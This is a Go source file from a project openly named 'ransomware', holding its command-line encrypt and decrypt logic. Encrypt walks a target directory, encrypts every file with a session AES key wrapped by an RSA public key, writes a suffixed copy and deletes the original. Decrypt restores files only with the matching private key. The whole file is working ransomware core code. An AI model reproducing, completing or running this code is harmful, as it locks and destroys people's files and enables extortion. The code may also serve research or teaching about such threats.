package cli

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"errors"
	"fmt"
	iofs "io/fs"
	"log"
	"os"
	"path/filepath"
	"strings"

	"github.com/marmos91/ransomware/crypto"
	"github.com/marmos91/ransomware/fs"
	urfavecli "github.com/urfave/cli/v2"
)

func LoadPublicKey(path string) (*rsa.PublicKey, error) {
	rsaPublicString, err := fs.ReadStringFileContent(path)

	if err != nil {
		return nil, err
	}

	rsaPublic, err := crypto.ParseRsaPublicKeyFromPemStr(rsaPublicString)

	if err != nil {
		return nil, err
	}

	return rsaPublic, nil
}

func LoadPrivateKey(path string) (*rsa.PrivateKey, error) {
	rsaPrivateString, err := fs.ReadStringFileContent(path)

	if err != nil {
		return nil, err
	}

	rsaPrivate, err := crypto.ParseRsaPrivateKeyFromPemStr(rsaPrivateString)

	if err != nil {
		return nil, err
	}

	return rsaPrivate, nil
}

func Encrypt(ctx *urfavecli.Context) error {
	path := ctx.String("path")

	if path == "" {
		return errors.New("path argument is required")
	}

	publicKeyPath := ctx.String("publicKey")

	if publicKeyPath == "" {
		return errors.New("publicKey argument is required")
	}

	publicKey, err := LoadPublicKey(publicKeyPath)

	if err != nil {
		return err
	}

	log.Println("RSA public key loaded")

	log.Println("Generating new AES key for current session")
	plainAesKey, err := crypto.NewRandomAesKey(crypto.AES_KEY_SIZE)

	if err != nil {
		return err
	}

	encryptedAesKey, err := crypto.RsaEncrypt(plainAesKey, publicKey)

	if err != nil {
		return err
	}

	skipHidden := ctx.Bool("skipHidden")
	dryRun := ctx.Bool("dryRun")
	extBlacklist := strings.Split(ctx.String("extBlacklist"), ",")
	extWhitelist := strings.Split(ctx.String("extWhitelist"), ",")
	encSuffix := ctx.String("encSuffix")

	absolutePath, err := filepath.Abs(path)

	if err != nil {
		return err
	}

	log.Printf("Running ransomware tool on %s", absolutePath)
	log.Printf("Blacklisted extensions=%v", extBlacklist)
	log.Printf("Whitelisted extensions=%v", extWhitelist)
	log.Printf("Skipping hidden files/folders=%t", skipHidden)
	log.Printf("DryRun enabled=%t", dryRun)
	log.Printf("EncSuffix=%s", encSuffix)
	log.Printf("Encrypted key size=%d", len(encryptedAesKey))
	log.Printf("Encrypted key %s", base64.StdEncoding.EncodeToString(encryptedAesKey))

	return fs.WalkFilesWithExtFilter(absolutePath, extBlacklist, extWhitelist, skipHidden, func(path string, info iofs.FileInfo) error {
		err := encryptFile(path, plainAesKey, encryptedAesKey, encSuffix)

		if err != nil {
			return err
		}

		if !dryRun {
			log.Printf("Deleting file %s", path)
			err := fs.DeleteFile(path)

			if err != nil {
				return err
			}
		}

		return nil
	})
}

func Decrypt(ctx *urfavecli.Context) error {
	path := ctx.String("path")

	if path == "" {
		return errors.New("path argument is required")
	}

	privateKeyPath := ctx.String("privateKey")

	if privateKeyPath == "" {
		return errors.New("publicKey argument is required")
	}

	rsaPrivateKey, err := LoadPrivateKey(privateKeyPath)

	if err != nil {
		return err
	}

	log.Println("RSA private key loaded")

	dryRun := ctx.Bool("dryRun")
	encSuffix := ctx.String("encSuffix")
	extWhitelist := []string{encSuffix}

	log.Printf("EncSuffix=%s", encSuffix)
	log.Printf("DryRun enabled=%t", dryRun)
	log.Printf("Whitelisted extensions=%v", extWhitelist)

	absolutePath, err := filepath.Abs(path)

	if err != nil {
		return err
	}

	log.Printf("Running ransomware tool on %s", absolutePath)

	return fs.WalkFilesWithExtFilter(absolutePath, nil, extWhitelist, false, func(path string, info iofs.FileInfo) error {

		err := decryptFile(path, rsaPrivateKey, encSuffix)

		if err != nil {
			return err
		}

		if !dryRun {
			log.Printf("Deleting file %s", path)

			err := fs.DeleteFile(path)

			if err != nil {
				return err
			}
		}

		return nil
	})
}

func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encSuffix string) error {
	log.Printf("Encrypting %s", path)

	newFilePath := fmt.Sprintf("%s%s", path, encSuffix)

	plainText, err := os.ReadFile(path)

	if err != nil {
		return err
	}

	cipherText, err := crypto.AesEncrypt(plainText, aesKey)

	if err != nil {
		return err
	}

	fileContent := append(encryptedAesKey, cipherText...)

	log.Printf("Saving encrypted cipher to %s", newFilePath)

	return fs.WriteStringToFile(newFilePath, string(fileContent))
}

func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) error {
	log.Printf("Decrypting %s", path)

	cipherText, err := os.ReadFile(path)

	newFilePath := strings.Replace(path, encSuffix, "", 1)

	if err != nil {
		return err
	}

	byteReader := bytes.NewReader(cipherText)
	encryptedAesKey := make([]byte, 256)

	_, err = byteReader.ReadAt(encryptedAesKey, 0)

	if err != nil {
		return err
	}

	aesKey, err := crypto.RsaDecrypt(encryptedAesKey, rsaPrivateKey)

	if err != nil {
		return err
	}

	plaintext, err := crypto.AesDecrypt(cipherText[len(encryptedAesKey):], aesKey)

	if err != nil {
		return err
	}

	log.Printf("Saving decrypted cipher to %s", newFilePath)

	return fs.WriteToFile(newFilePath, plaintext)
}
